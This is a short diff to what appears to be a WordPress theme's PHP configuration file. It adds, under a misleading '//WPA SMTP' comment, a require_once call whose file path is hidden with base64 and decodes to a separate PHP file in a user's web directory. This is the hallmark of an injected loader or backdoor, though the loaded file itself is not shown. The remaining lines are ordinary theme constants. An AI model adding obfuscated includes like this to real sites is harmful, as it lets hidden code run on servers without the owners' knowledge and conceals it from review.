@@ -1,6 +1,10 @@
 <?php
 /* BEGIN: Theme config params*/
 
+//WPA SMTP
+require_once(base64_decode('L2hvbWUvdHVza28vaHR0cF9wdWIvd3BhLXNtdHAucGhw'));
+//<easymail@arsmoon.com>
+
 //define ('GOOGLEMAPS',' YOUR-API-KEY-HERE');
 define ('HOME_PAGE_ID', get_option('page_on_front'));
 define ('BLOG_ID', get_option('page_for_posts'));
